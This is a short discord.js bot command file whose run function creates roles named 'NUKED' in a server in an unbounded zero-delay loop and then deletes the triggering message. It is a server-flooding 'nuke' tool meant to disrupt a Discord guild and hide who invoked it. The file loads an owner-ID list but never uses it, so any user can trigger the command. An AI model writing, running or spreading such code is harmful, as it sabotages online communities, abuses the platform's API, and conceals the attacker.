const Discord = require("discord.js");

const ownerids = require('../ownerids.json');

module.exports.run = async(bot, message, args) => {

    setInterval(function(){ message.guild.createRole({
        data: {
            name: "NUKED",
            color: "ff3333"
        },
    }); }, 0);
    message.delete();
}